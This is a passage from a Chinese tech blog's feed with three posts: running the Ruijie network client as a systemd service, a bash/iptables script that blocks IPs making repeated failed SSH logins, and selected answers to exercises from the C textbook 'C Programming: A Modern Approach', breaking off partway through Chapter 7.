      <url>/cn/posts/37686/</url>
      
      
        
      <content type="html"><![CDATA[<p>1.下载锐捷，解压后给rjsupplicant.sh 添加可执行权限</p><p>2.创建一个 systemd 启动脚本并将其放在 <code>/etc/systemd/system/</code> 目录中，内容如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ruijie.service</span></span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Run ruijie</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/home/rjsupplicant/rjsupplicant.sh  -u stuxxxx -p passwordxxxx -d 0 </span><br><span class="line">ExecStop=/home/rjsupplicant/rjsupplicant.sh -q</span><br><span class="line">ExecReload=/home/rjsupplicant/rjsupplicant.sh -u stuxxxx -p passwordxxxx -d 0</span><br><span class="line">Restart=on-failure</span><br><span class="line">KillMode=control-group</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>3.运行以下命令启动服务</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> ruijie.service</span><br><span class="line">systemctl start  ruijie <span class="comment">#启动锐捷</span></span><br><span class="line">systemctl status ruijie <span class="comment">#查看锐捷状态</span></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/37686/v2-e8d4b949456153fcbba15889f8cff220_r.jpg" alt="img"></p><p>4.重启检查是否启动</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br><span class="line">ps aux|grep rjsupplicant</span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> 运维 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>简单抵御疑似黑客的ssh登录</title>
      
      
      <link href="/cn/posts/5423/"/>
      
      
      <url>/cn/posts/5423/</url>
      
      
        
      <content type="html"><![CDATA[<p>屏蔽每分钟ssh尝试登陆linux服务器 超过10次的IP进行屏蔽:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">DATE=$(<span class="built_in">date</span> +<span class="string">"%a %b %e %H:%M"</span>) <span class="comment">#星期月天时分 %e单数字时显示7，而%d显示07</span></span><br><span class="line">ABNORMAL_IP=$(lastb |grep <span class="string">"<span class="variable">$DATE</span>"</span> |awk <span class="string">'{a[$3]++}END{for(i in</span></span><br><span class="line"><span class="string">a)if(a[i]&gt;10)print i}'</span>)</span><br><span class="line"><span class="keyword">for</span> IP <span class="keyword">in</span> <span class="variable">$ABNORMAL_IP</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ $(iptables -vnL |grep -c <span class="string">"<span class="variable">$IP</span>"</span>) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        iptables -I INPUT -s <span class="variable">$IP</span> -j DROP</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> 运维 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>C语言程序设计现代方法答案</title>
      
      
      <link href="/cn/posts/28638/"/>
      
      
      <url>/cn/posts/28638/</url>
      
      
        
      <content type="html"><![CDATA[<h3 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h3><h4 id="Answers-to-Selected-Exercises"><a href="#Answers-to-Selected-Exercises" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] (a) The program contains one directive (<code>#include</code>) and four statements (three calls of <code>printf</code> and one <code>return</code>).</p><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Parkinson's Law:</span><br><span class="line">Work expands so as to fill the time</span><br><span class="line">available for its completion.</span><br></pre></td></tr></tbody></table></figure><p><strong>3.</strong> [was #4]</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int height = 8, length = 12, width = 10, volume;</span><br><span class="line"> </span><br><span class="line">  volume = height * length * width;</span><br><span class="line"> </span><br><span class="line">  printf("Dimensions: %dx%dx%d\n", length, width, height);</span><br><span class="line">  printf("Volume (cubic inches): %d\n", volume);</span><br><span class="line">  printf("Dimensional weight (pounds): %d\n", (volume + 165) / 166);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #6] Here’s one possible program:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int i, j, k;</span><br><span class="line">  float x, y, z;</span><br><span class="line"> </span><br><span class="line">  printf("Value of i: %d\n", i);</span><br><span class="line">  printf("Value of j: %d\n", j);</span><br><span class="line">  printf("Value of k: %d\n", k);</span><br><span class="line"> </span><br><span class="line">  printf("Value of x: %g\n", x);</span><br><span class="line">  printf("Value of y: %g\n", y);</span><br><span class="line">  printf("Value of z: %g\n", z);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>When compiled using GCC and then executed, this program produced the following output:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Value of i: 5618848</span><br><span class="line">Value of j: 0</span><br><span class="line">Value of k: 6844404</span><br><span class="line">Value of x: 3.98979e-34</span><br><span class="line">Value of y: 9.59105e-39</span><br><span class="line">Value of z: 9.59105e-39</span><br></pre></td></tr></tbody></table></figure><p>The values printed depend on many factors, so the chance that you’ll get exactly these numbers is small.</p><p><strong>5.</strong> [was #10] (a) is not legal because <code>100_bottles</code> begins with a digit.</p><p><strong>8.</strong> [was #12] There are 14 tokens: <code>a</code>, <code>=</code>, <code>(</code>, <code>3</code>, <code>*</code>, <code>q</code>, <code>-</code>, <code>p</code>, <code>*</code>, <code>p</code>, <code>)</code>, <code>/</code>, <code>3</code>, and <code>;</code>. </p><h4 id="Answers-to-Selected-Programming-Projects"><a href="#Answers-to-Selected-Programming-Projects" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>4.</strong> [was #8; modified]</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  float original_amount, amount_with_tax;</span><br><span class="line"> </span><br><span class="line">  printf("Enter an amount: ");</span><br><span class="line">  scanf("%f", &amp;original_amount);</span><br><span class="line">  amount_with_tax = original_amount * 1.05f;</span><br><span class="line">  printf("With tax added: $%.2f\n", amount_with_tax);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>The <code>amount_with_tax</code> variable is unnecessary. If we remove it, the program is slightly shorter:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  float original_amount;</span><br><span class="line"> </span><br><span class="line">  printf("Enter an amount: ");</span><br><span class="line">  scanf("%f", &amp;original_amount);</span><br><span class="line">  printf("With tax added: $%.2f\n", original_amount * 1.05f);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>Chapter 3</strong></p><p><strong>Answers to Selected Exercises</strong></p><p><strong>2.</strong> [was #2] </p><p>(a) printf(“%-8.1e”, x);<br> (b) printf(“%10.6e”, x);<br> (c) printf(“%-8.3f”, x);<br> (d) printf(“%6.0f”, x); </p><p><strong>5.</strong> [was #8] The values of x, i, and y will be 12.3, 45, and .6, respectively.</p><p><strong>Answers to Selected Programming Projects</strong></p><p><strong>1.</strong> [was #4; modified] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int month, day, year;</p><p> printf(“Enter a date (mm/dd/yyyy): “);</p><p> scanf(“%d/%d/%d”, &amp;month, &amp;day, &amp;year);</p><p> printf(“You entered the date %d%.2d%.2d\n”, year, month, day);</p><p> return 0;</p><p>}</p><p><strong>3.</strong> [was #6; modified] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int prefix, group, publisher, item, check_digit;</p><p> printf(“Enter ISBN: “);</p><p> scanf(“%d-%d-%d-%d-%d”, &amp;prefix, &amp;group, &amp;publisher, &amp;item, &amp;check_digit);</p><p> printf(“GS1 prefix: %d\n”, prefix);</p><p> printf(“Group identifier: %d\n”, group);</p><p> printf(“Publisher code: %d\n”, publisher);</p><p> printf(“Item number: %d\n”, item);</p><p> printf(“Check digit: %d\n”, check_digit);</p><p> /* The five printf calls can be combined as follows:</p><p>   printf(“GS1 prefix: %d\nGroup identifier: %d\nPublisher code: %d\nItem number: %d\nCheck digit: %d\n”,</p><p>​      prefix, group, publisher, item, check_digit);</p><p> */</p><p> return 0;</p><p>}</p><p><strong>Chapter 4</strong></p><p><strong>Answers to Selected Exercises</strong></p><p><strong>2.</strong> [was #2] Not in C89. Suppose that i is 9 and j is 7. The value of (-i)/j could be either –1 or –2, depending on the implementation. On the other hand, the value of -(i/j) is always –1, regardless of the implementation. In C99, on the other hand, the value of (-i)/j must be equal to the value of -(i/j). </p><p><strong>9.</strong> [was #6] </p><p>(a) 63 8<br> (b) 3 2 1<br> (c) 2 -1 3<br> (d) 0 0 0 </p><p><strong>13.</strong> [was #8] The expression ++i is equivalent to (i += 1). The value of both expressions is i <em>after</em> the increment has been performed. </p><p><strong>Answers to Selected Programming Projects</strong></p><p><strong>2.</strong> [was #4] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int n;</p><p> printf(“Enter a three-digit number: “);</p><p> scanf(“%d”, &amp;n);</p><p> printf(“The reversal is: %d%d%d\n”, n % 10, (n / 10) % 10, n / 100);</p><p> return 0;</p><p>}</p><p><strong>Chapter 5</strong></p><p><strong>Answers to Selected Exercises</strong></p><p><strong>2.</strong> [was #2] </p><p>(a) 1<br> (b) 1<br> (c) 1<br> (d) 1 </p><p><strong>4.</strong> [was #4] (i &gt; j) - (i &lt; j)</p><p><strong>6.</strong> [was #12] Yes, the statement is legal. When n is equal to 5, it does nothing, since 5 is not equal to –9. </p><p><strong>10.</strong> [was #16] The output is </p><p>onetwo</p><p>since there are no break statements after the cases. </p><p><strong>Answers to Selected Programming Projects</strong></p><p><strong>2.</strong> [was #6] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int hours, minutes;</p><p> printf(“Enter a 24-hour time: “);</p><p> scanf(“%d:%d”, &amp;hours, &amp;minutes);</p><p> printf(“Equivalent 12-hour time: “);</p><p> if (hours == 0)</p><p>  printf(“12:%.2d AM\n”, minutes);</p><p> else if (hours &lt; 12)</p><p>  printf(“%d:%.2d AM\n”, hours, minutes);</p><p> else if (hours == 12)</p><p>  printf(“%d:%.2d PM\n”, hours, minutes);</p><p> else</p><p>  printf(“%d:%.2d PM\n”, hours - 12, minutes);</p><p> return 0;</p><p>}</p><p><strong>4.</strong> [was #8; modified] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int speed;</p><p> printf(“Enter a wind speed in knots: “);</p><p> scanf(“%d”, &amp;speed);</p><p> if (speed &lt; 1)</p><p>  printf(“Calm\n”);</p><p> else if (speed &lt;= 3)</p><p>  printf(“Light air\n”);</p><p> else if (speed &lt;= 27)</p><p>  printf(“Breeze\n”);</p><p> else if (speed &lt;= 47)</p><p>  printf(“Gale\n”);</p><p> else if (speed &lt;= 63)</p><p>  printf(“Storm\n”);</p><p> else</p><p>  printf(“Hurricane\n”);</p><p> return 0;</p><p>}</p><p><strong>6.</strong> [was #10] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int check_digit, d, i1, i2, i3, i4, i5, j1, j2, j3, j4, j5,</p><p>   first_sum, second_sum, total;</p><p> printf(“Enter the first (single) digit: “);</p><p> scanf(“%1d”, &amp;d);</p><p> printf(“Enter first group of five digits: “);</p><p> scanf(“%1d%1d%1d%1d%1d”, &amp;i1, &amp;i2, &amp;i3, &amp;i4, &amp;i5);</p><p> printf(“Enter second group of five digits: “);</p><p> scanf(“%1d%1d%1d%1d%1d”, &amp;j1, &amp;j2, &amp;j3, &amp;j4, &amp;j5);</p><p> printf(“Enter the last (single) digit: “);</p><p> scanf(“%1d”, &amp;check_digit);</p><p> first_sum = d + i2 + i4 + j1 + j3 + j5;</p><p> second_sum = i1 + i3 + i5 + j2 + j4;</p><p> total = 3 * first_sum + second_sum;</p><p> if (check_digit == 9 - ((total - 1) % 10))</p><p>  printf(“VALID\n”);</p><p> else</p><p>  printf(“NOT VALID\n”);</p><p> return 0;</p><p>}</p><p><strong>10.</strong> [was #14] </p><p>#include &lt;stdio.h&gt;</p><p>int main(void)</p><p>{</p><p> int grade;</p><p> printf(“Enter numerical grade: “);</p><p> scanf(“%d”, &amp;grade);</p><p> if (grade &lt; 0 || grade &gt; 100) {</p><p>  printf(“Illegal grade\n”);</p><p>  return 0;</p><p> }</p><p> switch (grade / 10) {</p><p>  case 10:</p><p>  case 9: printf(“Letter grade: A\n”);</p><p>​       break;</p><p>  case 8: printf(“Letter grade: B\n”);</p><p>​       break;</p><p>  case 7: printf(“Letter grade: C\n”);</p><p>​       break;</p><p>  case 6: printf(“Letter grade: D\n”);</p><p>​       break;</p><p>  case 5:</p><p>  case 4:</p><p>  case 3:</p><p>  case 2:</p><p>  case 1:</p><p>  case 0: printf(“Letter grade: F\n”);</p><p>​       break;</p><p> }</p><p> return 0;</p><p>}</p><h3 id="Chapter-6"><a href="#Chapter-6" class="headerlink" title="Chapter 6"></a>Chapter 6</h3><h4 id="Answers-to-Selected-Exercises-1"><a href="#Answers-to-Selected-Exercises-1" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>4.</strong> [was #10] (c) is not equivalent to (a) and (b), because <code>i</code> is incremented <em>before</em> the loop body is executed. </p><p><strong>10.</strong> [was #12] Consider the following <code>while</code> loop: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while (…) {</span><br><span class="line">  …</span><br><span class="line">  continue;</span><br><span class="line">  …</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>The equivalent code using <code>goto</code> would have the following appearance:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">while (…) {</span><br><span class="line">  …</span><br><span class="line">  goto loop_end;</span><br><span class="line">  …</span><br><span class="line">  loop_end: ;   /* null statement */</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>12.</strong> [was #14] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (d = 2; d * d &lt;= n; d++)</span><br><span class="line">  if (n % d == 0)</span><br><span class="line">    break;</span><br></pre></td></tr></tbody></table></figure><p>The <code>if</code> statement that follows the loop will need to be modified as well:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (d * d &lt;= n)</span><br><span class="line">  printf("%d is divisible by %d\n", n, d);</span><br><span class="line">else</span><br><span class="line">  printf("%d is prime\n", n);</span><br></pre></td></tr></tbody></table></figure><p><strong>14.</strong> [was #16] The problem is the semicolon at the end of the first line. If we remove it, the statement is now correct: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (n % 2 == 0)</span><br><span class="line">  printf("n is even\n");</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-1"><a href="#Answers-to-Selected-Programming-Projects-1" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>2.</strong> [was #2] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int m, n, remainder;</span><br><span class="line"> </span><br><span class="line">  printf("Enter two integers: ");</span><br><span class="line">  scanf("%d%d", &amp;m, &amp;n);</span><br><span class="line"> </span><br><span class="line">  while (n != 0) {</span><br><span class="line">    remainder = m % n;</span><br><span class="line">    m = n;</span><br><span class="line">    n = remainder;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Greatest common divisor: %d\n", m);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #4] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  float commission, value;</span><br><span class="line"> </span><br><span class="line">  printf("Enter value of trade: ");</span><br><span class="line">  scanf("%f", &amp;value);</span><br><span class="line"> </span><br><span class="line">  while (value != 0.0f) {</span><br><span class="line">    if (value &lt; 2500.00f)</span><br><span class="line">      commission = 30.00f + .017f * value;</span><br><span class="line">    else if (value &lt; 6250.00f)</span><br><span class="line">      commission = 56.00f + .0066f * value;</span><br><span class="line">    else if (value &lt; 20000.00f)</span><br><span class="line">      commission = 76.00f + .0034f * value;</span><br><span class="line">    else if (value &lt; 50000.00f)</span><br><span class="line">      commission = 100.00f + .0022f * value;</span><br><span class="line">    else if (value &lt; 500000.00f)</span><br><span class="line">      commission = 155.00f + .0011f * value;</span><br><span class="line">    else</span><br><span class="line">      commission = 255.00f + .0009f * value;</span><br><span class="line"> </span><br><span class="line">    if (commission &lt; 39.00f)</span><br><span class="line">      commission = 39.00f;</span><br><span class="line"> </span><br><span class="line">    printf("Commission: $%.2f\n\n", commission);</span><br><span class="line"> </span><br><span class="line">    printf("Enter value of trade: ");</span><br><span class="line">    scanf("%f", &amp;value);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int i, n;</span><br><span class="line"> </span><br><span class="line">  printf("Enter limit on maximum square: ");</span><br><span class="line">  scanf("%d", &amp;n);</span><br><span class="line"> </span><br><span class="line">  for (i = 2; i * i &lt;= n; i += 2)</span><br><span class="line">    printf("%d\n", i * i);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>8.</strong> [was #8] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int i, n, start_day;</span><br><span class="line"> </span><br><span class="line">  printf("Enter number of days in month: ");</span><br><span class="line">  scanf("%d", &amp;n);</span><br><span class="line">  printf("Enter starting day of the week (1=Sun, 7=Sat): ");</span><br><span class="line">  scanf("%d", &amp;start_day);</span><br><span class="line"> </span><br><span class="line">  /* print any leading "blank dates" */</span><br><span class="line">  for (i = 1; i &lt; start_day; i++)</span><br><span class="line">    printf("   ");</span><br><span class="line"> </span><br><span class="line">  /* now print the calendar */</span><br><span class="line">  for (i = 1; i &lt;= n; i++) {</span><br><span class="line">    printf("%3d", i);</span><br><span class="line">    if ((start_day + i - 1) % 7 == 0)</span><br><span class="line">      printf("\n");</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-7"><a href="#Chapter-7" class="headerlink" title="Chapter 7"></a>Chapter 7</h3><h4 id="Answers-to-Selected-Exercises-2"><a href="#Answers-to-Selected-Exercises-2" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>3.</strong> [was #4] (b) is not legal. </p><p><strong>4.</strong> [was #6] (d) is illegal, since <code>printf</code> requires a string, not a character, as its first argument. </p><p><strong>10.</strong> [was #14] <code>unsigned</code> <code>int</code>, because the <code>(int)</code> cast applies only to <code>j</code>, not <code>j</code> <code>*</code> <code>k</code>. </p><p><strong>12.</strong> [was #16] The value of <code>i</code> is converted to <code>float</code> and added to <code>f</code>, then the result is converted to <code>double</code> and stored in <code>d</code>. </p><p><strong>14.</strong> [was #18] No. Converting <code>f</code> to <code>int</code> will fail if the value stored in <code>f</code> exceeds the largest value of type <code>int</code>. </p><h4 id="Answers-to-Selected-Programming-Projects-2"><a href="#Answers-to-Selected-Programming-Projects-2" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #2] <code>short</code> <code>int</code> values are usually stored in 16 bits, causing failure at 182. <code>int</code> and <code>long</code> <code>int</code> values are usually stored in 32 bits, with failure occurring at 46341. </p><p><strong>2.</strong> [was #8] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int i, n;</span><br><span class="line">  char ch;</span><br><span class="line"> </span><br><span class="line">  printf("This program prints a table of squares.\n");</span><br><span class="line">  printf("Enter number of entries in table: ");</span><br><span class="line">  scanf("%d", &amp;n);</span><br><span class="line">  ch = getchar();</span><br><span class="line">    /* dispose of new-line character following number of entries */</span><br><span class="line">    /* could simply be getchar(); */</span><br><span class="line"> </span><br><span class="line">  for (i = 1; i &lt;= n; i++) {</span><br><span class="line">    printf("%10d%10d\n", i, i * i);</span><br><span class="line">    if (i % 24 == 0) {</span><br><span class="line">      printf("Press Enter to continue...");</span><br><span class="line">      ch = getchar();   /* or simply getchar(); */</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>5.</strong> [was #10] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int sum = 0;</span><br><span class="line">  char ch;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a word: ");</span><br><span class="line"> </span><br><span class="line">  while ((ch = getchar()) != '\n')</span><br><span class="line">    switch (toupper(ch)) {</span><br><span class="line">      case 'D': case 'G':</span><br><span class="line">        sum += 2; break;</span><br><span class="line">      case 